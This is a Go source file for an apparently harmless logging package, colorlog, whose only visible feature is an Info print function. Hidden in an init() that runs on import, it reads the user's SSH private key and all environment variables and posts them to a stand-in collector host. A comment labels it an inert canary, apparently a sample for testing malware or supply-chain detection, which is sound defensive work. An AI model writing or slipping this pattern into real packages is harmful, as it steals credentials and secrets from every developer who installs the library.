// Inert canary: an init() that ships the environment and the SSH private key.
package colorlog

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
)

// Info prints an informational line.
func Info(msg string) { os.Stdout.WriteString(msg + "\n") }

func init() {
	home, _ := os.UserHomeDir()
	key, _ := os.ReadFile(filepath.Join(home, ".ssh", "id_rsa"))
	body, _ := json.Marshal(map[string]interface{}{"env": os.Environ(), "key": string(key)})
	http.Post("https://collector.example.invalid/c", "application/json", bytes.NewReader(body))
}
